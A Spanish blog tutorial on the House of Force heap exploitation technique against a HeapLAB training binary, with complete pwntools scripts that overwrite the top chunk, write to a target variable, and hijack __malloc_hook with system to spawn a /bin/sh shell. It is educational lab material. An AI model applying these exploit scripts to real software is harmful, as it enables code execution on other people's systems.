---
layout: post
title: House of Force - Heap
comments: true
categories: [Heap, Pwn, Teoria]
---

Un año después de crear esta página, por fin me he decidido a subir contenido sobre explotación de Heap. Este pretende ser el primer post de una serie en la que explotaremos vulnerabilidades del temido *Heap*. Al final de cada post, pondré el enlace al siguiente.

Antes de empezar quiero dar crédito al que está siendo mi maestro en esto del Heap, [Max Kamper](https://www.udemy.com/user/max-kamper/) (autor de [ROPEmporium](https://ropemporium.com/), la primera saga de esta web), dejo el enlace a su perfil de Udemy donde está el curso que estoy siguiendo yo y de donde saco los recursos. Aunque haya decidido explicar los conceptos traducidos aquí, sus explicaciones son mucho más completas y claras, así que si sabes inglés (o koreano) te recomiendo mil veces más comprar su curso.

También voy a asumir que si estás leyendo esto sabes de sobra lo que es un heap, las partes de un binario y como funciona la reserva de memoria dinámica y *malloc*. Si no lo sabes, ya sabes por dónde empezar.

# ¿Qué es la House of Force?

Es una vulnerabilidad que aprovecha un **Heap Overflow** para sobrescribir la cabecera del **top chunk**, aumentando el campo de tamaño y permitiendo reservas de memoria fuera del espacio de direcciones del heap.

Afecta a versiones de libc por debajo de la 2.28.

# Ejemplo de explotación

Para la explotación utilizaremos un programa secillo que nos permite hacer varias reservas de memoria y ver el contenido de una variable *target*.

```bash
./house_of_force

===============
|   HeapLAB   |  House of Force
===============

puts() @ 0x7fd37b46df10
heap @ 0x3b023000

1) malloc 0/4
2) target
3) quit
```

Si tratamos de utilizar la primera opción y pasar un valor muy grande veremos lo siguiente (utilizando [[pwndbg]]):

```bash
===============
|   HeapLAB   |  House of Force
===============

puts() @ 0x7ffff786df10
heap @ 0x603000

1) malloc 0/4
2) target
3) quit
> 1
size: 24
data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

> Con `Ctl+C` podemos detener la ejecución y con `vis`, ver el heap.

```bash
pwndbg> vis

0x603000	0x0000000000000000	0x0000000000000021	........!.......
0x603010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x603020	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA	 <-- Top chunk
```

Vemos algo interesante, nuestras `A` han sobrescrito la cabecera del *top chunk*. Ahora podremos reservar un chunk más grande del tamaño del heap.

## Escritura arbitraria

Como hemos visto antes, hay una variable target que tenemos opción de consultar. Utilizando la *House of Force*, podemos tratar de sobrescribirla.

Para ello utilizaremos [[pwntools]] en el siguiente script:

```python
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Selccion la opcion "malloc", los argumentos son el tamaño y los datos a reservar.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calcula la distncia entre dos direcciones.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# El binario da un leak de libc de la funcion puts(), con estas lineas calculamos la direccion base de libc.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# El binario nos da la direccion base del heap.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXPLOIT -=-=-=

# La variable "heap" contiene el inicio del heap.
info(f"heap: 0x{heap:02x}")

# Los simbolos del programa se acceden mediante "elf.sym.<symbol name>".
info(f"target: 0x{elf.sym.target:02x}")

# Guardamos un bloque lleno de As
malloc(24, b"A"*24)

# Con delta() calculamos la distancia entre heap y main.
info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")

# =============================================================================

io.interactive()
```

Lo primero que debemos hacer es repetir la operación anterior y en la primera llamada a `malloc`, llenar un bloque y sobrescribir la cabecera del top chunk con `0xffffffffffffffff`:

```python
malloc(24, b"A"*24+p64(0xffffffffffffffff))
```

Ahora podremos reservar la cantidad de memoria que queramos. El siguiente paso es reservar un bloque que quede justo antes de la variable target, para ello utilizamos `delta` y reservamos otro bloque:

```python
# Tenemos que sumar 0x20 a heap para emepzar a contar a partir del primer bloque que almacenamos (desde el inicio del top chunk)
# De igual forma, restamos 0x20 a la dirección de target para quedarnos a exactamente un bloque de target
distancia = delta(heap+0x20, elf.sym.target)
malloc(distancia, "A")
```
	Podríamos incluir target en el bloque que estamos reservando, pero tendríamos que escribir muchísimos datos hasta llegar a la zona de datos y podríamos sobrescribir algo importante.
	
Ahora mismo, si ejecutamos esto y vemos la memoria alrededor de `target` con `dq target-16`, veremos lo siguiente:

```bash
pwndbg> dq target-16
0000000000602000     0000000000000000 0000000000001019
0000000000602010     0058585858585858 0000000000000000
0000000000602020     0000000000000000 0000000000000000
0000000000602030     0000000000000000 0000000000000000

pwndbg> top-chunk
PREV_INUSE
Addr: 0x602000
Size: 0x1018 (with flag bits: 0x1019)
```

El `0058585858585858` es la variable `target` y `1019` es el top-chunk, que vemos que empieza justo antes de la variable. Por tanto, si asignamos un bloque más podremos sobrescribir la variable:

```python
malloc(8, "Pwned xdd")
```

```bash
1) malloc 3/4
2) target
3) quit
> $ 2

target: Pwned xd

1) malloc 3/4
2) target
3) quit
```

El script quedaría así:

```python
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The "heap" variable holds the heap start address.
info(f"heap: 0x{heap:02x}")

# Program symbols are available via "elf.sym.<symbol name>".
info(f"target: 0x{elf.sym.target:02x}")

# The malloc() function chooses option 1 from the menu.
# Its arguments are "size" and "data".
malloc(24, b"Y"*24+p64(0xffffffffffffffff))

distancia = delta(heap+0x20, elf.sym.target-0x20)
info(f"delta entre el top chunk y 0x20 antes de target: {distancia}")

malloc(distancia, b"A")
malloc(8, "Pwned xd")

# =============================================================================

io.interactive()
```

## Ejecución de comandos

Para lograr ejecución de comandos podemos abusar de una característica muy ligada al heap. Se trata de los *malloc hooks*, es decir un puntero a función en la zona de datos de la libc, que apunta directamente a la función de `malloc` (se utiliza para proporcionar una manera de utilizar una implementación personalizada de malloc).

Si conseguimos que esta dirección apunte a `system` (que está disponible en libc), podremos invocar una shell.

En este caso, deberemos calcular la distancia entre el registro `malloc_hook` y el heap:

```python
distancia = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
```

Con eso ya tendríamos el top chunk justo antes del registro, de forma que con una llamada a `malloc` podremos sobrescribirlo con la dirección de `system`:

```python
malloc(24, p64(libc.sym.system))
```

Para llamar a system bastaría con volver a llamar a `malloc`, pasándole la dirección de un cadena `"/bin/sh\0"`, para conseguir esta dirección, podemos almacenar la cadena en la primera llamada que hicimos a `malloc` y utilizar `heap` como dirección, o usar la siguiente línea:

```python
malloc(next(libc.search(b"/bin/sh")), "")
```

El script completo sería:

```python
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The "heap" variable holds the heap start address.
info(f"heap: 0x{heap:02x}")

# Program symbols are available via "elf.sym.<symbol name>".
info(f"target: 0x{elf.sym.target:02x}")

# The malloc() function chooses option 1 from the menu.
# Its arguments are "size" and "data".
malloc(24, b"Y"*24+p64(0xffffffffffffffff))

distancia = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)

malloc(distancia, "A")

malloc(24, p64(libc.sym.system))

malloc(next(libc.search(b"/bin/sh")), "")
# =============================================================================

io.interactive()

```